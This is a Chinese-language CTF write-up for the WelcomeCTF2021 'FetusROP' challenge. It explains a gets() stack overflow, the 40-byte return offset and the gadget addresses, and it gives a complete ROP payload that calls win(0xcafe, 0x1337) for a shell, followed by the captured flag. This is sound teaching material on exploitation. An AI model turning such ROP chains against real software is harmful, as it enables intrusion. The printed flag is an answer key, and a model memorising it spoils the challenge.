# FetusROP

## 题目简述

WelcomeCTF2021 的 FetusROP 在 32 字节缓冲区上调用 `gets`。程序提供 `win(int a, int b)`，但只有参数分别为 `0xcafe` 和 `0x1337` 时才执行 `/bin/bash`。NX 开启后，需要用 ROP 设置参数寄存器。

## 解题过程

返回地址偏移为 40 字节。64 位调用约定将前两个整数参数分别放在 `RDI` 和 `RSI`。二进制中可用的关键 gadget 为：

```text
0x4005f3 : pop rdi ; ret
0x4005f1 : pop rsi ; pop r15 ; ret
0x400537 : win
```

第二个 gadget 还会额外弹出 `R15`，所以栈上必须补一个占位值。完整链为：

```python
payload = b"A" * 40
payload += p64(0x4005f3) + p64(0xcafe)
payload += p64(0x4005f1) + p64(0x1337) + p64(0)
payload += p64(0x400537)
```

执行顺序等价于设置 `RDI=0xcafe`、`RSI=0x1337`，再返回到 `win`。条件成立后得到 shell，并读取：

```text
greyhats{y0ur_pwn_j0urn3y_b3g1ns_982h89h}
```

## 方法总结

ROP 链本质上是在栈上安排一串“代码地址—参数—代码地址”。遇到 `pop rsi; pop r15; ret` 这类复合 gadget 时，必须为所有 `pop` 提供对应槽位；漏掉占位值会让后续函数地址被错误弹入寄存器。
